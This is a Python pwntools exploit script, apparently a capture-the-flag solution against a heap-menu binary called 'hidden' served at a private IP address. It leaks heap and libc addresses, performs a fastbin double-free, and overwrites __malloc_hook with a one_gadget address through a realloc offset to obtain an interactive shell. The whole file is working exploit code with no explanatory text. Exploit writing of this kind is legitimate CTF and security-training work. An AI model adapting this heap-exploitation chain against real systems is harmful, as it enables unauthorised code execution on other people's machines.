#!/usr/bin/env python
from pwn import *

context.log_level = 'debug'

elf = ELF('./hidden')

local = 0
if local:
    with open('/flag.txt', 'wb') as f:
        f.write('flag{test}')
    p = process('./hidden')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
    p = remote('172.20.49.114', 8888)
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

def debug():
    gdb.attach(p)

def cmd(num):
    p.recvuntil("choice: \n\n")
    p.sendline((num))
def add(idx):
    cmd('001')
    p.recvuntil("idx\n\n")
    p.sendline((idx))
def show(idx, content):
    cmd('002')
    p.recvuntil("idx\n\n")
    p.sendline((idx))
    p.recvuntil("mark\n\n")
    p.sendline(content)
def free(idx):
    cmd('003')
    p.recvuntil("idx\n\n")
    p.sendline((idx))
one='000'
two='001'

add(one)
add(two)
free(one)
free(two)
add(one)
show(one,'')
p.recvuntil('Mark begin:')
heap_addr = u64(p.recv(6).ljust(8,'\x00'))-0xa
flag_addr = heap_addr + 0x240
success(hex(heap_addr))
show(one,'A'*7)
p.recvuntil('Mark begin:AAAAAAA\n')
offset = 0x7ffff7dd1b78-0x00007ffff7a0d000

libc_addr = u64(p.recv(6).ljust(8,'\x00'))-offset
success(hex(libc_addr))
add(two)
free(one)
add(one)

free(one)
free(two)
free(one)

one_gad = [0x45216,0x4526a,0xf02a4,0xf1147] 

offset1 = 0x7ffff7a916c0 - 0x00007ffff7a0d000
libc_realloc = offset1 + libc_addr

malloc_hook = libc.sym['__malloc_hook'] + libc_addr-0x23
realloc = libc.sym['realloc'] + libc_addr
success(hex(malloc_hook))
show(one,p64(malloc_hook))
add(one)
add(one)
show(one,'a'*0xb+p64(one_gad[3]+libc_addr)+p64(libc_realloc))
#debug()
add(two)

#debug()
#add(two)



p.interactive()
